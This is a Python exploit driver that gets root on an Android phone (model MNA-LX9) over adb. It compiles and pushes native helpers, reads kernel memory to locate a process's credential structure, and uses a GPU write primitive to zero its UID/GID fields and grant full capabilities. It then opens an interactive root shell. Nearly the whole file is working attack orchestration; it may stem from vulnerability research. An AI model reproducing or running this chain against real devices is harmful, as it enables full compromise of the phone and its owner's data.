#!/usr/bin/env python3
"""Reproduce the verified, temporary shell-to-UID0 chain on this boot.

Run from a local terminal: python3 probe/reproduce_uid0.py
The script refuses a different boot, device, or credential layout.
"""
import os
import re
import select
import shutil
import struct
import subprocess
import sys
from pathlib import Path

import task_walk as t

ROOT = Path(__file__).resolve().parents[1]
SERIAL = os.environ.get("P60_ADB_SERIAL")
HELPER = ROOT / "probe/out/cred_target"
PHYS_PROBE = ROOT / "probe/out/kgsl_phys_probe"
HELPER_SRC = ROOT / "probe/native/cred_target.c"
PHYS_PROBE_SRC = ROOT / "probe/native/kgsl_bulk_dump.c"
PATCH_SRC = ROOT / "probe/native/cred_patch_once.c"
PATCH_BIN = ROOT / "probe/out/cred_patch_once_current"
REMOTE_HELPER = "/data/local/tmp/p60_cred_target"
REMOTE_PHYS_PROBE = "/data/local/tmp/p60_vrp_kgsl_phys_probe"
REMOTE_PATCH = "/data/local/tmp/p60_cred_patch_current"
BOOT_ID_FILE = ROOT / "device/boot_id.txt"


def find_clang():
    direct = shutil.which("aarch64-linux-android28-clang")
    if direct:
        return Path(direct)
    ndk_roots = []
    for name in ("ANDROID_NDK_HOME", "ANDROID_NDK_ROOT"):
        if os.environ.get(name):
            ndk_roots.append(Path(os.environ[name]))
    for name in ("ANDROID_HOME", "ANDROID_SDK_ROOT"):
        if os.environ.get(name):
            ndk_roots.extend((Path(os.environ[name]) / "ndk").glob("*"))
    ndk_roots.extend((Path.home() / "Library/Android/sdk/ndk").glob("*"))
    for root in ndk_roots:
        for host in ("darwin-x86_64", "darwin-arm64", "linux-x86_64"):
            candidate = root / "toolchains/llvm/prebuilt" / host / "bin/aarch64-linux-android28-clang"
            if candidate.is_file():
                return candidate
    raise RuntimeError("Android NDK clang not found; set ANDROID_NDK_HOME")


def adb(*args, capture=True):
    if not SERIAL:
        raise RuntimeError("P60_ADB_SERIAL is required for device operations")
    cmd = ["adb", "-s", SERIAL, *args]
    return subprocess.run(cmd, check=True, capture_output=capture, text=True)


def check_boot():
    if not BOOT_ID_FILE.is_file():
        raise RuntimeError("device/boot_id.txt is missing; prepare local boot map first")
    if not t.INIT_TASK_NEXT.is_file() or len(t.INIT_TASK_NEXT.read_bytes()) != 8:
        raise RuntimeError("device/init_task_next.bin must contain one 8-byte boot-specific pointer")
    expected_boot_id = BOOT_ID_FILE.read_text().strip()
    current = adb("shell", "cat", "/proc/sys/kernel/random/boot_id").stdout.strip()
    if current != expected_boot_id:
        raise RuntimeError(
            f"Boot changed: current={current}, map boot={expected_boot_id}. "
            "Rebuild the live kernel map before running this script."
        )
    model = adb("shell", "getprop", "ro.product.model").stdout.strip()
    if model != "MNA-LX9":
        raise RuntimeError(f"unexpected model: {model}")
    print(f"target={SERIAL} model={model} boot={current}", flush=True)


def build_helpers(clang):
    HELPER.parent.mkdir(parents=True, exist_ok=True)
    builds = (
        (HELPER_SRC, HELPER, ()),
        (PHYS_PROBE_SRC, PHYS_PROBE,
         ("-DPAGES=64", "-DREQUIRE_IMAGE_MAGIC=0",
          '-DDUMP_PATH="/data/local/tmp/p60_phys_probe.bin"')),
    )
    for source, output, definitions in builds:
        if not source.is_file():
            raise RuntimeError(f"missing helper source: {source}")
        temporary = output.with_name(output.name + ".building")
        try:
            subprocess.run([str(clang), "-O2", "-static", "-w", *definitions,
                            "-o", str(temporary), str(source)],
                           check=True, cwd=ROOT)
            os.replace(temporary, output)
        finally:
            temporary.unlink(missing_ok=True)


def read_line(pipe, timeout=20):
    data = bytearray()
    fd = pipe.fileno()
    while True:
        ready, _, _ = select.select([fd], [], [], timeout)
        if not ready:
            raise TimeoutError("target did not answer")
        byte = os.read(fd, 1)
        if not byte:
            raise EOFError("target exited before a line was read")
        data += byte
        if byte == b"\n":
            return data.decode(errors="replace").strip()


def u64(data, offset):
    return struct.unpack_from("<Q", data, offset)[0]


def u32(data, offset):
    return struct.unpack_from("<I", data, offset)[0]


def find_task(pid):
    t.cache.clear()
    head = t.INIT_TASK_VA + t.TASKS_OFF
    first_pointer = t.INIT_TASK_NEXT.read_bytes()
    if len(first_pointer) != 8:
        raise RuntimeError("invalid init_task_next.bin")
    next_node = u64(first_pointer, 0)
    seen = set()
    for _ in range(2000):
        if next_node == head or next_node in seen:
            break
        seen.add(next_node)
        task_pa = t.direct_pa(next_node - t.TASKS_OFF)
        task = t.read_physical(task_pa, 0x800)
        if u32(task, t.PID_OFF) == pid:
            return task_pa, task
        next_node = u64(task, t.TASKS_OFF)
    raise RuntimeError(f"PID {pid} not found in live task list")


def check_target(pid, task_pa, cred_va, cred_pa, expected_id,
                 expected_securebits=0x2f, expected_caps=None):
    t.cache.clear()
    task = t.read_physical(task_pa, 0x800)
    if u32(task, t.PID_OFF) != pid:
        raise RuntimeError("target PID changed")
    if u64(task, t.CRED_OFF) != cred_va or u64(task, t.CRED_OFF + 8) != cred_va:
        raise RuntimeError("target cred pointer changed")
    cred = t.read_physical(cred_pa, 0x80)
    if u32(cred, 0) != 2 or u32(cred, 0x24) != expected_securebits:
        raise RuntimeError("target cred usage or securebits changed")
    ids = [u32(cred, offset) for offset in range(4, 0x24, 4)]
    if ids != [expected_id] * 8:
        raise RuntimeError(f"unexpected credential IDs: {ids}")
    if expected_caps is not None:
        caps = tuple(u64(cred, offset) for offset in (0x30, 0x38, 0x40))
        if caps != expected_caps:
            raise RuntimeError(f"unexpected credential capabilities: {caps}")
    return cred


def patch_command(mode, cred_pa):
    result = adb("shell", REMOTE_PATCH, mode, hex(cred_pa))
    print(result.stdout.strip(), flush=True)
    return result.stdout


def interactive(child, full_caps):
    description = "tam capability'li UID 0" if full_caps else "UID 0"
    print(f"{description} shell hazır. 'id' ile doğrulayabilirsin; çıkmak için 'exit'.", flush=True)
    stdin_fd = sys.stdin.fileno()
    out_fd = child.stdout.fileno()
    while child.poll() is None:
        ready, _, _ = select.select([stdin_fd, out_fd], [], [], 0.5)
        if out_fd in ready:
            data = os.read(out_fd, 4096)
            if not data:
                break
            os.write(sys.stdout.fileno(), data)
        if stdin_fd in ready:
            data = os.read(stdin_fd, 4096)
            if not data:
                break
            child.stdin.write(data)
            child.stdin.flush()


def main():
    if len(sys.argv) > 2 or (len(sys.argv) == 2 and sys.argv[1] not in ("--full-caps", "--build-only")):
        raise RuntimeError("usage: python3 probe/reproduce_uid0.py [--full-caps|--build-only]")
    full_caps = len(sys.argv) == 2 and sys.argv[1] == "--full-caps"
    build_only = len(sys.argv) == 2 and sys.argv[1] == "--build-only"
    if not PATCH_SRC.is_file():
        raise RuntimeError("GPU patch source missing")
    clang = find_clang()
    build_helpers(clang)
    if build_only:
        print(f"built {HELPER.relative_to(ROOT)} and {PHYS_PROBE.relative_to(ROOT)}", flush=True)
        return
    check_boot()
    adb("push", str(PHYS_PROBE), REMOTE_PHYS_PROBE)
    adb("shell", "chmod", "700", REMOTE_PHYS_PROBE)
    adb("push", str(HELPER), REMOTE_HELPER)
    adb("shell", "chmod", "700", REMOTE_HELPER)
    child = subprocess.Popen(
        ["adb", "-s", SERIAL, "shell", "-tt", REMOTE_HELPER],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0,
    )
    try:
        first = read_line(child.stdout)
        second = read_line(child.stdout)
        print(first, flush=True)
        print(second, flush=True)
        match = re.search(r"pid=(\d+) uid=2000 gid=2000 setresuid=0 setresgid=0", first)
        if not match:
            raise RuntimeError("helper did not start as expected")
        pid = int(match.group(1))
        task_pa, task = find_task(pid)
        comm = task[t.COMM_OFF:t.COMM_OFF + 16].split(b"\0", 1)[0]
        cred_va = u64(task, t.CRED_OFF + 8)
        if comm != b"p60_cred_target" or u64(task, t.CRED_OFF) != cred_va:
            raise RuntimeError("task name or credential pointers do not match")
        cred_pa = t.direct_pa(cred_va)
        check_target(pid, task_pa, cred_va, cred_pa, 2000,
                     expected_caps=(0, 0, 0xc0))
        print(f"target PID={pid} task_pa={task_pa:#x} cred_pa={cred_pa:#x}", flush=True)
        subprocess.run(
            [str(clang), "-O2", "-static", "-w", f"-DTARGET_CRED_PA={cred_pa:#x}ULL",
             "-o", str(PATCH_BIN), str(PATCH_SRC)],
            check=True,
            cwd=ROOT,
        )
        adb("push", str(PATCH_BIN), REMOTE_PATCH)
        adb("shell", "chmod", "700", REMOTE_PATCH)
        inspected = patch_command("--inspect", cred_pa)
        if "preflight passed" not in inspected:
            raise RuntimeError("GPU preflight did not pass")
        check_boot()
        check_target(pid, task_pa, cred_va, cred_pa, 2000,
                     expected_caps=(0, 0, 0xc0))
        write_mode = "--write-shell-full" if full_caps else "--write"
        written = patch_command(write_mode, cred_pa)
        expected_write = "single-submit write-shell-full completion=0" if full_caps else "single-submit write completion=0"
        if expected_write not in written:
            raise RuntimeError("GPU write did not complete")
        if full_caps:
            mask = 0x3ffffffffff
            check_target(pid, task_pa, cred_va, cred_pa, 0,
                         expected_securebits=0, expected_caps=(mask, mask, mask))
            print("physical readback: UID/GID zero and full capability masks", flush=True)
        else:
            check_target(pid, task_pa, cred_va, cred_pa, 0)
            print("physical readback: all eight UID/GID fields are zero", flush=True)
        child.stdin.write(b"s\n")
        child.stdin.flush()
        interactive(child, full_caps)
    finally:
        if child.poll() is None:
            child.terminate()
            try:
                child.wait(timeout=3)
            except subprocess.TimeoutExpired:
                child.kill()
        try:
            adb("shell", "rm", "-f", REMOTE_PATCH)
        except (OSError, subprocess.CalledProcessError):
            pass
        try:
            adb("shell", "rm", "-f", REMOTE_PHYS_PROBE,
                "/data/local/tmp/p60_phys_probe.bin", REMOTE_HELPER)
        except (OSError, subprocess.CalledProcessError):
            pass
        PATCH_BIN.unlink(missing_ok=True)


if __name__ == "__main__":
    try:
        main()
    except (OSError, subprocess.CalledProcessError, RuntimeError, TimeoutError, EOFError) as exc:
        print(f"reproduction aborted: {exc}", file=sys.stderr)
        raise SystemExit(1)
